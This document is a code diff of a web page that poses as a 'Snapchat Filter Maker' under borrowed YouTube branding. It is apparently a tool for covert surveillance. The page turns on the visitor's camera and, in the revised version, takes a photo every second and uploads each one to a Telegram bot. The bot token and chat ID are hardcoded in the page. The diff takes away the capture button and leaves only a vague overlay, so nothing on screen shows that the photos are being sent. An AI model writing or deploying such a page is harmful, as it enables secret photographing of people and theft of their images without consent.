@@ -2,110 +2,86 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Snapchat Filter Maker</title>
   <style>
-    body {
+    * {
       margin: 0;
-      font-family: Arial, sans-serif;
-      background-color: #ffffff;
-      color: #000;
+      padding: 0;
+      box-sizing: border-box;
     }
-
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #121212;
+      color: white;
+      overflow: hidden;
+    }
     header {
+      background-color: #ff0000;
+      padding: 10px 20px;
       display: flex;
       align-items: center;
-      background-color: #ff0000;
-      padding: 10px;
+      font-size: 20px;
     }
-
     header img {
       height: 30px;
       margin-right: 10px;
     }
-
-    header h1 {
-      font-size: 20px;
+    #video {
+      width: 100vw;
+      height: 100vh;
+      object-fit: cover;
+    }
+    .overlay {
+      position: absolute;
+      top: 60px;
+      left: 0;
+      width: 100%;
+      text-align: center;
+      font-size: 18px;
       color: white;
-    }
-
-    main {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding: 20px;
-    }
-
-    video {
-      width: 90%;
-      max-width: 400px;
-      margin: 20px 0;
-      border-radius: 10px;
-    }
-
-    canvas {
-      display: none;
-    }
-
-    button {
-      display: none;
     }
   </style>
 </head>
 <body>
-
   <header>
-    <img src="https://www.freepnglogos.com/uploads/youtube-logo-png-hd-20.png" alt="YouTube Logo" />
-    <h1>Snapchat Filter Maker</h1>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" alt="YouTube">
+    Snapchat Filter Maker
   </header>
 
-  <main>
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
-    <button id="captureBtn" onclick="sendPhoto()">Capture</button>
-  </main>
+  <video id="video" autoplay playsinline muted></video>
+  <div class="overlay">Camera running... capturing every second</div>
 
   <script>
+    const chatId = '1193693663';
+    const token = '7327624845:AAH5wGHCSFiWOvj2jWOU7K6Yk8YunRXqr24';
     const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const captureBtn = document.getElementById('captureBtn');
 
-    async function startCamera() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
+    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+      video.srcObject = stream;
 
-        setTimeout(() => {
-          captureBtn.click();
-        }, 3000); // waits 3 seconds before auto-capturing
-
-      } catch (err) {
-        alert("Camera access denied or not available.");
-      }
-    }
+      setInterval(() => {
+        sendPhoto();
+      }, 1000); // every 1 second
+    });
 
     function sendPhoto() {
-      const context = canvas.getContext('2d');
+      const canvas = document.createElement('canvas');
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      const photo = canvas.toDataURL('image/jpeg');
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', blob, 'capture.jpg');
 
-      const token = "7327624845:AAH5wGHCSFiWOvj2jWOU7K6Yk8YunRXqr24";
-      const chat_id = "1193693663";
-      const url = `https://api.telegram.org/bot${token}/sendPhoto`;
-
-      fetch(url, {
-        method: 'POST',
-        body: new URLSearchParams({
-          chat_id: chat_id,
-          photo: photo
-        })
-      });
+        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        }).catch(err => console.error('Send error:', err));
+      }, 'image/jpeg');
     }
-
-    window.onload = startCamera;
   </script>
 </body>
 </html>
